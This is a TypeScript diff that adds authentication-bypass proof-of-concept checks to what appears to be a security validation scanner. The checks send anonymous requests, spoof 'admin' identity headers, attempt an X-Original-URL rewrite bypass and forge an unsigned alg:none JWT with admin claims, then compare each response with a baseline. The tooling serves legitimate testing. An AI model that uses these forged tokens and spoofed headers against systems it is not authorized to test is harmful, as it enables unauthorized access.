@@ -398,6 +398,166 @@ async function pocVerbTampering(target: string): Promise<Omit<ValidationResult, 
   };
 }
 
+// ---------- auth-bypass PoC class ----------
+
+const PROTECTED_HINT = /(sign\s*in|log\s*in|login|unauthori[sz]ed|forbidden|access denied|please authenticate)/i;
+
+async function pocAnonAccess(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
+  const s1 = await probeStep("Anonymous GET (no cookies, no auth headers)", "GET", target);
+  const status = s1.status ?? 0;
+  const loc = (s1.responseHeaders["location"] ?? "").toLowerCase();
+  const bodyHint = PROTECTED_HINT.test(s1.bodySnippet);
+  const looksProtected = /login|sign[-_ ]?in|auth/.test(loc) || (status === 401 || status === 403);
+  let verdict: Verdict = "inconclusive";
+  let summary = "";
+  if (status >= 200 && status < 300 && s1.bodyBytes > 0 && !bodyHint) {
+    verdict = "confirmed";
+    summary = `URL returned ${status} (${s1.bodyBytes} bytes) to an anonymous caller with no auth signal in the body. If this endpoint is meant to require login, access control is missing.`;
+  } else if (looksProtected) {
+    verdict = "not-exploitable";
+    summary = `Anonymous request rejected: status ${status}${loc ? ` → ${loc}` : ""}. Access control appears enforced.`;
+  } else if (status >= 200 && status < 300 && bodyHint) {
+    verdict = "not-exploitable";
+    summary = `Status ${status} but body contains an auth prompt — server returned a login page instead of protected data.`;
+  } else {
+    verdict = "inconclusive";
+    summary = `Anonymous request returned ${status || s1.error || "no response"}. Manual review required.`;
+  }
+  return {
+    verdict,
+    summary,
+    poc: "Issue a GET with no cookies / no Authorization header and inspect status, Location, and body for evidence of enforced authentication.",
+    steps: [s1],
+  };
+}
+
+async function pocForwardedUser(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
+  const baseline = await probeStep("Baseline anonymous GET", "GET", target);
+  const spoofed = await probeStep(
+    "GET with spoofed identity headers",
+    "GET",
+    target,
+    {
+      headers: {
+        "x-forwarded-user": "admin",
+        "x-forwarded-email": "admin@nsl-poc.invalid",
+        "x-remote-user": "admin",
+        "x-authenticated-user": "admin",
+      },
+    },
+  );
+  const bStatus = baseline.status ?? 0;
+  const sStatus = spoofed.status ?? 0;
+  const bLen = baseline.bodyBytes;
+  const sLen = spoofed.bodyBytes;
+  let verdict: Verdict = "not-exploitable";
+  let summary = `Baseline ${bStatus} (${bLen}B) vs spoofed ${sStatus} (${sLen}B). Server ignored the injected identity headers.`;
+  const baselineLocked = bStatus === 401 || bStatus === 403 || /login|sign[-_ ]?in|auth/.test(baseline.responseHeaders["location"] ?? "");
+  const spoofedAllowed = sStatus >= 200 && sStatus < 300 && sLen > 0 && !PROTECTED_HINT.test(spoofed.bodySnippet);
+  if (baselineLocked && spoofedAllowed) {
+    verdict = "confirmed";
+    summary = `Baseline blocked (${bStatus}) but request with X-Forwarded-User: admin returned ${sStatus} with ${sLen} bytes. Upstream trusts client-supplied identity headers — authentication bypass.`;
+  } else if (bStatus === sStatus && Math.abs(bLen - sLen) < 32) {
+    verdict = "not-exploitable";
+    summary = `Identical response for anonymous vs spoofed identity headers (status ${sStatus}). Headers ignored.`;
+  } else if (!baselineLocked && spoofedAllowed && sLen > bLen + 256) {
+    verdict = "inconclusive";
+    summary = `Spoofed response is materially larger than baseline (${sLen}B vs ${bLen}B). Endpoint may reflect the injected identity — manual review.`;
+  }
+  return {
+    verdict,
+    summary,
+    poc: "Compare a baseline anonymous GET with a GET carrying X-Forwarded-User / X-Remote-User / X-Authenticated-User headers.",
+    steps: [baseline, spoofed],
+  };
+}
+
+async function pocOriginalUrl(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
+  const u = new URL(target);
+  const publicPath = "/";
+  const targetedPath = u.pathname + u.search;
+  const rewriteUrl = new URL(publicPath, u).toString();
+  const baseline = await probeStep(`Baseline anonymous GET ${targetedPath}`, "GET", target);
+  const spoofed = await probeStep(
+    `GET ${publicPath} with X-Original-URL: ${targetedPath}`,
+    "GET",
+    rewriteUrl,
+    {
+      headers: {
+        "x-original-url": targetedPath,
+        "x-rewrite-url": targetedPath,
+      },
+    },
+  );
+  const bStatus = baseline.status ?? 0;
+  const sStatus = spoofed.status ?? 0;
+  const baselineLocked = bStatus === 401 || bStatus === 403;
+  const spoofedAllowed = sStatus >= 200 && sStatus < 300 && spoofed.bodyBytes > 0 && !PROTECTED_HINT.test(spoofed.bodySnippet);
+  let verdict: Verdict = "not-exploitable";
+  let summary = `Baseline ${bStatus} (${baseline.bodyBytes}B) vs rewrite ${sStatus} (${spoofed.bodyBytes}B). No rewrite bypass observed.`;
+  if (baselineLocked && spoofedAllowed) {
+    verdict = "confirmed";
+    summary = `Direct access to ${targetedPath} returned ${bStatus}, but GET ${publicPath} with X-Original-URL: ${targetedPath} returned ${sStatus} with ${spoofed.bodyBytes} bytes. IIS/nginx-style URL rewrite bypasses the ACL.`;
+  } else if (targetedPath === publicPath) {
+    verdict = "inconclusive";
+    summary = "Target URL path is already '/'. Point this PoC at a specific protected path (e.g. /admin) for a meaningful test.";
+  }
+  return {
+    verdict,
+    summary,
+    poc: "Request an unprotected path (e.g. /) with X-Original-URL / X-Rewrite-URL pointing at the protected path; compare to a direct request.",
+    steps: [baseline, spoofed],
+  };
+}
+
+function b64urlEncode(input: string): string {
+  return Buffer.from(input, "utf8").toString("base64").replace(/=+$/g, "").replace(/\+/g, "-").replace(/\//g, "_");
+}
+
+async function pocJwtAlgNone(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
+  const header = b64urlEncode(JSON.stringify({ alg: "none", typ: "JWT" }));
+  const now = Math.floor(Date.now() / 1000);
+  const payload = b64urlEncode(JSON.stringify({
+    sub: "nsl-poc",
+    iss: "nsl-poc",
+    aud: "nsl-poc",
+    iat: now,
+    exp: now + 3600,
+    role: "admin",
+    scope: "admin",
+  }));
+  const forged = `${header}.${payload}.`;
+  const baseline = await probeStep("Baseline anonymous GET (no token)", "GET", target);
+  const spoofed = await probeStep(
+    "GET with Authorization: Bearer <alg:none JWT>",
+    "GET",
+    target,
+    { headers: { authorization: `Bearer ${forged}` } },
+  );
+  const bStatus = baseline.status ?? 0;
+  const sStatus = spoofed.status ?? 0;
+  const baselineLocked = bStatus === 401 || bStatus === 403;
+  const spoofedAllowed = sStatus >= 200 && sStatus < 300 && spoofed.bodyBytes > 0 && !PROTECTED_HINT.test(spoofed.bodySnippet);
+  let verdict: Verdict = "not-exploitable";
+  let summary = `Baseline ${bStatus} vs alg:none token ${sStatus}. Server did not accept the unsigned token.`;
+  if (baselineLocked && spoofedAllowed) {
+    verdict = "confirmed";
+    summary = `Anonymous request rejected (${bStatus}) but an unsigned JWT with alg:"none" was accepted (${sStatus}, ${spoofed.bodyBytes} bytes). JWT verifier trusts the alg header — full authentication bypass.`;
+  } else if (sStatus === 401 || sStatus === 403) {
+    verdict = "not-exploitable";
+    summary = `Server rejected the alg:none token with ${sStatus}.`;
+  } else if (sStatus === bStatus) {
+    verdict = "inconclusive";
+    summary = `Server ignored the Authorization header (both responses ${sStatus}). Endpoint may not consume JWTs.`;
+  }
+  return {
+    verdict,
+    summary,
+    poc: `Send Authorization: Bearer <header.payload.> where header is {"alg":"none","typ":"JWT"} and payload asserts an admin claim. Compare to an anonymous baseline.`,
+    steps: [baseline, spoofed],
+  };
+}
+
 // ---------- dispatcher ----------
 
 export const POC_LIBRARY = [
@@ -411,6 +571,10 @@ export const POC_LIBRARY = [
   { id: "headers", label: "Security header audit", active: false, desc: "Snapshot response headers and flag missing hardening headers." },
   { id: "redirect-chain", label: "Redirect chain", active: false, desc: "Follow up to 5 hops; flag off-origin or protocol downgrade." },
   { id: "verb-tampering", label: "HTTP verb tampering", active: true, desc: "PUT / DELETE / PATCH / TRACE against the same URL." },
+  { id: "anon-access", label: "Auth bypass: anonymous access", active: false, desc: "Check whether a supposedly protected URL returns data to a caller with no cookies or Authorization header." },
+  { id: "forwarded-user", label: "Auth bypass: X-Forwarded-User trust", active: false, desc: "Compare anonymous vs spoofed X-Forwarded-User / X-Remote-User headers." },
+  { id: "original-url", label: "Auth bypass: X-Original-URL rewrite", active: false, desc: "Fetch '/' with X-Original-URL pointing at the protected path; look for ACL bypass." },
+  { id: "jwt-alg-none", label: "Auth bypass: JWT alg:none", active: false, desc: "Send an unsigned JWT (alg:\"none\") asserting admin claims and compare to anonymous baseline." },
 ] as const;
 
 export type PocId = typeof POC_LIBRARY[number]["id"];
